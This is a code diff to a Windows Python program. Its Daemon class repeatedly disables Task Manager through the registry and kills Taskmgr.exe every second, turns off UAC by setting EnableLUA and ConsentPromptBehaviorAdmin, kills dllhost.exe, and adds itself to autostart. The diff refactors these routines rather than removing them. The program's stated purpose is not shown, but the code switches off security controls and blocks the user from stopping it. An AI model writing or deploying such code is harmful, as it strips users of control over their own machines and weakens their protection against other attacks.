@@ -1,8 +1,8 @@
 from subprocess import run
 from ctypes import windll
 from sys import executable,argv
-from os import startfile,_exit,popen,listdir
-from os.path import join
+from os import startfile,_exit,remove,listdir
+from os.path import join,exists
 from threading import Thread
 from ctypes import windll,byref,sizeof
 from ctypes.wintypes import HWND,DWORD,RECT
@@ -137,6 +137,9 @@ def settings():
 
 workPath = reWorkPath()
 
+if exists(join(workPath,'settingsRuning.log')):
+    remove(join(workPath,'settingsRuning.log'))
+
 startfile(join(workPath,'settings.exe'))
 
 # configJson = open(join(workPath,'./config.json'),"w+",encoding='utf-8')
@@ -197,15 +200,13 @@ class Daemon:
             while True:
                 tskReg = """HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\system"""
                 run("reg add {} /v DisableTaskMgr /t REG_SZ /d {} /f".format(tskReg,type),shell=True)
-                rec = popen("taskkill /im Taskmgr.exe /f").read()
-                if len(rec) == 0:
-                    time.sleep(1)
+                run("taskkill /im Taskmgr.exe /f",shell=True)
+                time.sleep(1)
+
         else:
             tskReg = """HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\system"""
             run("reg add {} /v DisableTaskMgr /t REG_SZ /d {} /f".format(tskReg,type),shell=True)
-            rec = popen("taskkill /im Taskmgr.exe /f").read()
-            if len(rec) == 0:
-                time.sleep(1)
+            run("taskkill /im Taskmgr.exe /f",shell=True)
     def uac(self,whileTrue:bool=True,type:int=0):
         """禁用UAC"""
         if whileTrue:
@@ -214,17 +215,14 @@ class Daemon:
                 run("reg add {} /v EnableLUA /t REG_DWORD /d {} /f".format(uacReg,type),shell=True)
                 run("reg add {} /v PromptOnSecureDesktop /t REG_DWORD /d {} /f".format(uacReg,type),shell=True)
                 run("reg add {} /v ConsentPromptBehaviorAdmin /t REG_DWORD /d {} /f".format(uacReg,type),shell=True)
-                rec = popen("taskkill /im dllhost.exe /f").read()
-                if len(rec) == 0:
-                    time.sleep(1)
+                run("taskkill /im dllhost.exe /f",shell=True)
+                time.sleep(1)
         else:
             uacReg = """HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"""
             run("reg add {} /v EnableLUA /t REG_DWORD /d {} /f".format(uacReg,type),shell=True)
             run("reg add {} /v PromptOnSecureDesktop /t REG_DWORD /d {} /f".format(uacReg,type),shell=True)
             run("reg add {} /v ConsentPromptBehaviorAdmin /t REG_DWORD /d {} /f".format(uacReg,type),shell=True)
-            rec = popen("taskkill /im dllhost.exe /f").read()
-            if len(rec) == 0:
-                time.sleep(1)
+            run("taskkill /im dllhost.exe /f",shell=True)
     def startUp(self,whileTrue:bool=True,waitTime:float=10,setFile=False):
         """设置当前用户自启动"""
         global startUpArgv
@@ -337,6 +335,7 @@ while True:
         lowTime2 = getTime()
         settings()
     if (getTime() - lowTime3 >= 5 and time_check(setTime)[-1]) or debug:
+        lowTime3 = getTime()
         checkFullScreen_ = checkFullScreen()
         if checkFullScreen_:
             j = maxJ - 10
